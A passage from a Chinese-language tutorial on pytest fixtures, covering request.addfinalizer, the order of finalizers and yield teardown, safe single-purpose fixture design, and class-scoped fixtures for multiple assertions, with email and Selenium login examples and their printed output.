直接添加终结器finalizers</h3><p>虽然<code>yield</code>夹具被认为是更简单、更直接的选项，但还有另一种选择，那就是将“finalizers”函数直接添加到测试的请求上下文对象<code>request</code>中。</p><p>它带来了与yield装置类似的结果，但可能会让代码变得冗余了一点。</p><p>为了使用这种方法，我们必须在需要添加拆卸代码的固定装置中请求请求上下文对象（就像我们请求另一个固定装置一样），然后将包含该拆卸代码的可调用对象传递给其 addfinalizer 方法。</p><p>但我们必须小心，因为 pytest 在添加<code>finalizers</code>后将运行该终结器，即使该装置在添加<code>finalizers</code>后引发异常</p><p>因此，为了确保我们在不需要时不运行终结器代码，只有在夹具完成了我们需要拆卸的操作后，我们才会添加终结器。</p><p>这里的目的是，你可以将清理用户数据的方法，放在这个用例执行完成后执行，以下是使用 addfinalizer 方法的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_emaillib.py</span><br><span class="hljs-keyword">from</span> emaillib <span class="hljs-keyword">import</span> Email, MailAdminClient<br><span class="hljs-keyword">import</span> pytest<br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mail_admin</span>():<br>    <span class="hljs-keyword">return</span> MailAdminClient()<br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sending_user</span>(<span class="hljs-params">mail_admin</span>):<br>    user = mail_admin.create_user()<br>    <span class="hljs-keyword">yield</span> user<br>    mail_admin.delete_user(user)<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receiving_user</span>(<span class="hljs-params">mail_admin, request</span>):<br>    user = mail_admin.create_user()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_user</span>():<br>        mail_admin.delete_user(user)<br><br>    request.addfinalizer(delete_user) <span class="hljs-comment"># 被添加进去的函数，会在测试用例执行完之后执行</span><br>    <span class="hljs-keyword">return</span> user<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">email</span>(<span class="hljs-params">sending_user, receiving_user, request</span>):<br>    _email = Email(subject=<span class="hljs-string">&quot;Hey!&quot;</span>, body=<span class="hljs-string">&quot;How&#x27;s it going?&quot;</span>)<br>    sending_user.send_email(_email, receiving_user)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">empty_mailbox</span>():<br>        receiving_user.clear_mailbox() <span class="hljs-comment"># 这个方法，是在</span><br><br>    request.addfinalizer(empty_mailbox) <span class="hljs-comment"># 被添加进去的函数，会在测试用例执行完之后执行</span><br>    <span class="hljs-keyword">return</span> _email<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_email_received</span>(<span class="hljs-params">receiving_user, email</span>):<br>    <span class="hljs-keyword">assert</span> email <span class="hljs-keyword">in</span> receiving_user.inbox<br></code></pre></td></tr></table></figure><p>执行的结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">====================== test session starts ============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span><br><br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collected <span class="hljs-number">1</span> item                                                                                                                                                                    <br><br>testcases/test_fixturestest.py <br>create user<br>create user<br>send email<br>.clearing mailbox<br>delete user<br>delete user<br><br><br>======================================= <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ==========<br></code></pre></td></tr></table></figure><p><code>request.addfinalizer()</code> 添加的方法会在当前测试用例执行完成后运行。它会在测试用例的所有代码（包括测试函数、fixture、setup 和 teardown）执行完毕后被调用。</p><p>具体来说，<code>request.addfinalizer()</code> 方法用于注册一个清理函数，该函数将在以下情况之一发生时被调用：</p><ol><li>当前测试用例的测试函数执行完成后。</li><li>当前测试用例中的任何 fixture 的 <code>yield</code> 语句之后。</li><li>当前测试用例中的任何 fixture 的 <code>teardown</code> 方法执行完成后。</li></ol><p>简化一下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_fixture</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Performing cleanup,这是最后执行的&quot;</span>)<br><br>    request.addfinalizer(cleanup) <span class="hljs-comment"># 被添加进去的函数，会在测试用例执行完之后执行</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Setup&quot;</span>)<br>    <span class="hljs-keyword">yield</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Teardown&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_example2</span>(<span class="hljs-params">my_fixture</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Running test&quot;</span>)<br>    <br><span class="hljs-comment"># 你还可以写 lambda 匿名方法传进去，例如：</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_fixture</span>(<span class="hljs-params">request</span>):<br>    request.addfinalizer(<span class="hljs-keyword">lambda</span>: <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Performing cleanup,这是最后执行的&quot;</span>)) <span class="hljs-comment"># 被添加进去的函数，会在测试用例执行完之后执行</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Setup&quot;</span>)<br>    <span class="hljs-keyword">yield</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Teardown&quot;</span>)<br><span class="hljs-comment"># 你也可以将方法定义在外面：</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Performing cleanup,这是最后执行的&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_fixture</span>(<span class="hljs-params">request</span>):<br>    request.addfinalizer(cleanup) <span class="hljs-comment"># 被添加进去的函数，会在测试用例执行完之后执行</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Setup&quot;</span>)<br>    <span class="hljs-keyword">yield</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Teardown&quot;</span>)<br></code></pre></td></tr></table></figure><p>执行的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">====================== test session starts =================================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span><br><br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collected <span class="hljs-number">1</span> item                                                                                                                                                                    <br><br>testcases/test_fixturestest.py <br>Setup <span class="hljs-comment"># yield 前执行的</span><br>Running test <span class="hljs-comment"># 测试用例执行的</span><br>.Teardown <span class="hljs-comment"># yield 后执行的</span><br>Performing cleanup,这是最后执行的 <span class="hljs-comment"># 终结器执行的</span><br><br><br>======================== <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s =========<br></code></pre></td></tr></table></figure><p><code> request.addfinalizer()</code>和<code>fixture</code>函数里面添加<code>yield</code>的区别在于：</p><ul><li><code> request.addfinalizer()</code>的函数是在测试结束后执行，</li><li><code> request.addfinalizer()</code>可以在程序发生报错后仍然执行，<strong>而使用<code>yield</code>的话，<code>yield</code>前面的代码在执行时如果报错，那<code>yield</code>后面的代码就不会执行，</strong></li></ul><blockquote><p>另关于对于<code>request</code>的使用，后续开一篇文章讲解</p></blockquote><h4 id="关于finalizer顺序的注意事项【重点】"><a href="#关于finalizer顺序的注意事项【重点】" class="headerlink" title="关于finalizer顺序的注意事项【重点】"></a>关于finalizer顺序的注意事项【重点】</h4><p><code>finalizer</code>按照先进后出的顺序执行。对于<code>yield </code>的<code>fixture</code>，要运行的第一个<code>teardown</code>代码来自最右侧的<code>fixture</code>装置，即最后一个测试参数（入参）。</p><ul><li>从右往左顺序执行<code>yield</code> 的 <code>fixture</code></li></ul><p>看代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_finalizers.py</span><br><span class="hljs-keyword">import</span> pytest<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_bar</span>(<span class="hljs-params">fix_w_yield1, fix_w_yield2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test_bar&quot;</span>)<br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fix_w_yield1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;after_yield_1,start&quot;</span>)<br>    <span class="hljs-keyword">yield</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;after_yield_1,end&quot;</span>)<br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fix_w_yield2</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;after_yield_2,start&quot;</span>)<br>    <span class="hljs-keyword">yield</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;after_yield_2,end&quot;</span>)<br>    <br>$ pytest -s test_finalizers.py<br>=========================== test session starts ============================<br>platform linux -- Python <span class="hljs-number">3.</span>x.y, pytest-<span class="hljs-number">8.</span>x.y, pluggy-<span class="hljs-number">1.</span>x.y<br>rootdir: /home/sweet/project<br>collected <span class="hljs-number">1</span> item<br><br>test_finalizers.py <br>test_bar <span class="hljs-comment"># 先打印测试函数内的代码</span><br>.after_yield_2 <span class="hljs-comment"># 先执行的2</span><br>after_yield_1 <span class="hljs-comment"># 再执行的1</span><br>yield_1,start <span class="hljs-comment"># 开始时先执行的1的开始</span><br>after_yield_2,start <span class="hljs-comment"># 再执行2的开始</span><br>test_bar <span class="hljs-comment"># 再执行测试函数</span><br>.after_yield_2,end <span class="hljs-comment"># 结束时先执行2的结束</span><br>after_yield_1,end <span class="hljs-comment"># 再执行1的结束</span><br><br>============================ <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s =============================<br></code></pre></td></tr></table></figure><p>对于finalizers内注册的函数，优先运行最后一个添加进去的函数，依次往前运行。代码示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_finalizers.py</span><br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> partial<br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fix_w_finalizers</span>(<span class="hljs-params">request</span>):<br>    request.addfinalizer(partial(<span class="hljs-built_in">print</span>, <span class="hljs-string">&quot;finalizer_2&quot;</span>)) <span class="hljs-comment"># 后运行2</span><br>    request.addfinalizer(partial(<span class="hljs-built_in">print</span>, <span class="hljs-string">&quot;finalizer_1&quot;</span>)) <span class="hljs-comment"># 先运行1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_bar</span>(<span class="hljs-params">fix_w_finalizers</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test_bar&quot;</span>)<br>$ pytest -s test_finalizers.py<br>=========================== test session starts ============================<br>platform linux -- Python <span class="hljs-number">3.</span>x.y, pytest-<span class="hljs-number">8.</span>x.y, pluggy-<span class="hljs-number">1.</span>x.y<br>rootdir: /home/sweet/project<br>collected <span class="hljs-number">1</span> item<br><br>test_finalizers.py test_bar<br>.finalizer_1 <span class="hljs-comment"># 先运行1</span><br>finalizer_2 <span class="hljs-comment"># 后运行2</span><br><br><br>============================ <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s =============================<br></code></pre></td></tr></table></figure><p>之所以如此，是因为产量yield fixtures装置在幕后使用了 addfinalizer：当fixture装置执行时，addfinalizer 注册一个恢复生成器的函数，该函数又调用teardown代码。</p><blockquote><p>所以一个测试用例内的fixture的执行顺序是，入参中的最后一个先执行，addfinalizer注册的函数最后执行</p></blockquote><h2 id="4-5-teardowns安全【注意】"><a href="#4-5-teardowns安全【注意】" class="headerlink" title="4.5 teardowns安全【注意】"></a>4.5 teardowns安全【注意】</h2><p>pytest 的固定系统非常强大，但它仍然由计算机运行，因此它无法弄清楚如何安全地拆除我们扔给它的所有东西</p><p>如果我们不小心，错误位置的错误可能会留下测试中的内容，这可能很快会导致进一步的问题。</p><p>例如，考虑以下测试（基于上面的邮件示例）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_emaillib.py</span><br><span class="hljs-keyword">from</span> emaillib <span class="hljs-keyword">import</span> Email, MailAdminClient<br><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>():<br>    mail_admin = MailAdminClient()<br>    sending_user = mail_admin.create_user()<br>    receiving_user = mail_admin.create_user()<br>    email = Email(subject=<span class="hljs-string">&quot;Hey!&quot;</span>, body=<span class="hljs-string">&quot;How&#x27;s it going?&quot;</span>)<br>    sending_user.send_email(email, receiving_user)<br>    <span class="hljs-keyword">yield</span> receiving_user, email<br>    receiving_user.clear_mailbox()<br>    mail_admin.delete_user(sending_user)<br>    mail_admin.delete_user(receiving_user)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_email_received</span>(<span class="hljs-params">setup</span>):<br>    receiving_user, email = setup<br>    <span class="hljs-keyword">assert</span> email <span class="hljs-keyword">in</span> receiving_user.inbox<br></code></pre></td></tr></table></figure><ul><li><p>这个版本的代码看起来确实是更加紧凑，只定义了一个<code>fixture</code>函数,但是可这样的代码读性也会更差，没有什么描述性的<code>fixture</code>名称，一点也不见名知意，并且也无法做到轻松的重复使用这个<code>fixture</code>，复用性差。</p></li><li><p>这里还有一个更严重的问题，即如果在运行代码的时候有任何步骤引发了程序异常报错，则任何代码都不会运行。</p></li><li><p>所以有另一种选择就是使用 addfinalizer 注册方法而不是全部都堆在fixture里面，但是用addfinalizer的话可能会是代码变得相当复杂且难以维护（并且它不再紧凑）。有利有弊吧</p></li></ul><h3 id="4-5-1-fixture-安全结构"><a href="#4-5-1-fixture-安全结构" class="headerlink" title="4.5.1 fixture 安全结构"></a>4.5.1 fixture 安全结构</h3><p>最安全和最简单的<code>fixture</code>结构要求限制一个<code>fixture</code>仅进行一个状态的更改操作（<strong>意思就是一个<code>fixture</code>只做一件事情，逻辑不可以写多了</strong>），</p><p>然后将多个<code>fixture</code>与其他<code>fixture</code>代码捆绑在一起，如上面的电子邮件示例所示。</p><p> 状态更改操作失败但仍然修改状态的可能性可以忽略不计，因为大多数这些操作往往是基于事务的（至少在状态可能被抛在后面的测试级别）。</p><p> 因此，如果我们通过将任何成功的状态更改操作移动到单独的<code>fixture</code>并将其与其他有可能失败的状态更改操作分开来确保将其最后执行，那么我们的测试将有最多的可能离开测试环境</p><p>这里的意思，将必定成功的操作，和可能失败的操作拆分开来，将成功率大的和成功率大的操作放在一起，失败率大的放一起或者拆开来放，避免一头成功一头失败的，造成其他安全隐患</p><p> 举个例子，假设我们有一个带有登录页面的网站，并且我们可以访问可以生成用户的管理 API。 对于我们的测试，我们想要：</p><ol><li>通过该API 创建管理用户</li><li>使用 Selenium 启动浏览器</li><li>转到我们网站的登录页面</li><li>以我们创建的用户身份登录</li><li>在登录的标题中断言我们的用户名称</li></ol><p>我们不想让该用户留在系统数据中，避免脏数据，也不想让浏览器会话保持运行，因此我们希望确保创建这些东西的装置能够自行清理脏数据和关闭浏览器页面。</p><p>示例看起来是这样的：</p><blockquote><p>对于此示例，某些固定装置（即 base_url 和 admin_credentials）暗示存在于其他地方。所以现在，我们假设它们存在，但我们只是不去关注它们。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid4<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> Chrome<br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-keyword">from</span> src.utils.pages <span class="hljs-keyword">import</span> LoginPage, LandingPage<br><span class="hljs-keyword">from</span> src.utils <span class="hljs-keyword">import</span> AdminApiClient<br><span class="hljs-keyword">from</span> src.utils.data_types <span class="hljs-keyword">import</span> User<br><br><span class="hljs-comment"># 关注代码的分层</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_client</span>(<span class="hljs-params">base_url, admin_credentials</span>): <span class="hljs-comment"># 这个fixture只负责连接Url</span><br>    <span class="hljs-keyword">return</span> AdminApiClient(base_url, **admin_credentials)<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">admin_client</span>): <span class="hljs-comment"># 这个fixture只负责创建管理员用户，和结束时删除用户</span><br>    _user = User(name=<span class="hljs-string">&quot;Susan&quot;</span>, username=<span class="hljs-string">f&quot;testuser-<span class="hljs-subst">&#123;uuid4()&#125;</span>&quot;</span>, password=<span class="hljs-string">&quot;P4$$word&quot;</span>)<br>    admin_client.create_user(_user)<br>    <span class="hljs-keyword">yield</span> _user<br>    admin_client.delete_user(_user)<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">driver</span>(): <span class="hljs-comment"># 这个fixture，只负责定义浏览器驱动打开和关闭浏览器</span><br>    _driver = Chrome()<br>    <span class="hljs-keyword">yield</span> _driver<br>    _driver.quit()<br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">driver, base_url, user</span>): <span class="hljs-comment"># 这个fixute只负责用户的页面的打开和登录用户</span><br>    driver.get(urljoin(base_url, <span class="hljs-string">&quot;/login&quot;</span>)) <span class="hljs-comment"># 用户登录程序</span><br>    page = LoginPage(driver)<br>    page.login(user)<br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">landing_page</span>(<span class="hljs-params">driver, login</span>): <span class="hljs-comment"># 这个fixture 值负责将驱动和用户登录页面组合在一起，意思就是负责打开浏览器、进入用户登录页面登录</span><br>    <span class="hljs-keyword">return</span> LandingPage(driver)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_name_on_landing_page_after_login</span>(<span class="hljs-params">landing_page, user</span>): <span class="hljs-comment"># 测试代码，将所有fixtue组合</span><br>    <span class="hljs-keyword">assert</span> landing_page.header == <span class="hljs-string">f&quot;Welcome, <span class="hljs-subst">&#123;user.name&#125;</span>!&quot;</span><br></code></pre></td></tr></table></figure><p>依赖关系的布置方式意味着不清楚用户<code>fixture</code>是否会在驱动程序<code>fixture</code>之前执行。 </p><p>但这没关系，因为这些都是原子操作，所以哪个先运行并不重要，因为测试的事件序列仍然是线性化的。 </p><p>但重要的是，无论哪一个先运行，如果某一个抛出异常，而另一个没有抛出异常，那么两个都不会留下任何东西。</p><p> 如果驱动程序<code>fixture</code>在用户<code>fixture</code>之前执行，并且用户<code>fixture</code>引发异常，驱动程序<code>fixture</code>仍然会退出，并且用户永远不会被创建。 如果驱动程序是引发异常的人，那么驱动程序将永远不会启动，用户也永远不会被创建。</p><p>这里的意思还是做拆分，就像代码分层一样，原子层的操作和业务层的操作分开来，这里的代码就是将登录的操作和创建用户的操作分了层，打开浏览器的操作</p><ul><li>admin_client(base_url, admin_credentials) ：这个fixture只负责连接对应的 Url</li><li>user(admin_client)：这个fixture会使用到admin_client，只负责创建管理员用户，和结束时删除用户</li><li>driver() ：这个fixture，只负责定义浏览器驱动打开和关闭浏览器，不做其他操作</li><li>login(driver, base_url, user):  这个fixute是一个组合，将driver 和  base_url 和 user 三个组合到一起，作用是打开浏览器、打开对应的url 执行用户操作，结束时会将所有fixtue的结束操作全部执行</li></ul><p><strong>这是很好的一种编码设计思想，一种分层的思想，将用户登录的操作全部分层出来，测试代码只负责最终的组合，不关注它所依赖的fixture 的实现逻辑，只关注进和出。这里很重要</strong></p><h2 id="4-6-安全的运行多个assert断言语句"><a href="#4-6-安全的运行多个assert断言语句" class="headerlink" title="4.6 安全的运行多个assert断言语句"></a>4.6 安全的运行多个<code>assert</code>断言语句</h2><p>有时，您可能希望在完成所有设置后运行多个断言，这是有道理的，因为在更复杂的系统中，单个操作可以启动多个行为</p><p>pytest 有一种方便的方法来处理这个问题，它结合了我们到目前为止所讨论的一些内容。</p><p>所需要的只是逐步扩大到更大的范围，然后将行为步骤定义为自动使用固定装置，最后确保所有固定装置都针对更高级别的范围</p><p>让我们从上面举一个例子，并稍微调整一下。假设除了检查标题中的欢迎消息之外，我们还想检查注销按钮和用户个人资料的链接。</p><p>让我们看一下如何构建它，以便我们可以运行多个断言，而不必再次重复所有这些步骤。</p><blockquote><p>对于此示例，某些固定装置（即 base_url 和 admin_credentials）暗示存在于其他地方。所以现在，我们假设它们存在，但我们只是不去关注它们。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of tests/end_to_end/test_login.py</span><br><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid4<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> Chrome<br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-keyword">from</span> src.utils.pages <span class="hljs-keyword">import</span> LoginPage, LandingPage<br><span class="hljs-keyword">from</span> src.utils <span class="hljs-keyword">import</span> AdminApiClient<br><span class="hljs-keyword">from</span> src.utils.data_types <span class="hljs-keyword">import</span> User<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;class&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_client</span>(<span class="hljs-params">base_url, admin_credentials</span>):<br>    <span class="hljs-keyword">return</span> AdminApiClient(base_url, **admin_credentials)<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;class&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">admin_client</span>):<br>    _user = User(name=<span class="hljs-string">&quot;Susan&quot;</span>, username=<span class="hljs-string">f&quot;testuser-<span class="hljs-subst">&#123;uuid4()&#125;</span>&quot;</span>, password=<span class="hljs-string">&quot;P4$$word&quot;</span>)<br>    admin_client.create_user(_user)<br>    <span class="hljs-keyword">yield</span> _user<br>    admin_client.delete_user(_user)<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;class&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title 